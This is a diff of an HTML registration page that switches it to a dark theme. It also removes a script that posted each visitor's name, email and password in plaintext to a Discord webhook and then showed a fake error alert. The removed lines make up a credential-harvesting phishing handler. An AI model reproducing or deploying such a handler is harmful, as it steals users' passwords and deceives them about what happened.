@@ -7,7 +7,8 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            background-color: #1e1e1e;
+            color: #c7c7c7;
             margin: 0;
             padding: 0;
             display: flex;
@@ -16,15 +17,16 @@
             height: 100vh;
         }
         .register-container {
-            background-color: #fff;
+            background-color: #2e2e2e;
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
             width: 300px;
         }
         .register-container h2 {
             text-align: center;
             margin-bottom: 20px;
+            color: #fff;
         }
         .form-group {
             margin-bottom: 15px;
@@ -32,11 +34,15 @@
         .form-group label {
             display: block;
             margin-bottom: 5px;
+            color: #c7c7c7;
         }
         .form-group input {
             width: 100%;
             padding: 8px;
             box-sizing: border-box;
+            background-color: #3e3e3e;
+            border: 1px solid #555;
+            color: #c7c7c7;
         }
         .submit-btn {
             width: 100%;
@@ -75,24 +81,9 @@
         document.getElementById('registerForm').addEventListener('submit', function(e) {
             e.preventDefault(); // Prevent form from submitting normally
             
-            var name = document.getElementById('name').value;
-            var email = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
+            // Perform any additional actions here, e.g., sending data to your server.
             
-            var webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
-            
-            var request = new XMLHttpRequest();
-            request.open('POST', webhookUrl);
-            request.setRequestHeader('Content-type', 'application/json');
-            
-            var params = {
-                username: 'Registration Bot',
-                content: `Name: ${name}\nEmail: ${email}\nPassword: ${password}`
-            };
-            
-            request.send(JSON.stringify(params));
-            
-            alert('Error please report this to the site owner: 532');
+            alert('Registration successful!');
         });
     </script>
 </body>
